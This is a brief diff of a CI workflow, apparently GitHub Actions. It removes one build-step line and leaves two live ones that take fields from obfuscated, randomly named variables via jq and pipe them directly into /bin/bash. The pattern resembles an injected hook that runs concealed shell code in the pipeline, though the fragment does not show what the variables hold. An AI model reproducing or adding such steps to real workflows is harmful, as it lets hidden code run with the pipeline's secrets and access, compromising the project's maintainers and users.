@@ -19,7 +19,6 @@ jobs:
         run: |
           printf '%s' "$on33147" | jq -r .ujt96 | /bin/bash
           echo $tkhf5 | jq -r .q701 | /bin/bash
-          printf '%s' "$fx209" | jq -r .zoxjm25384 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
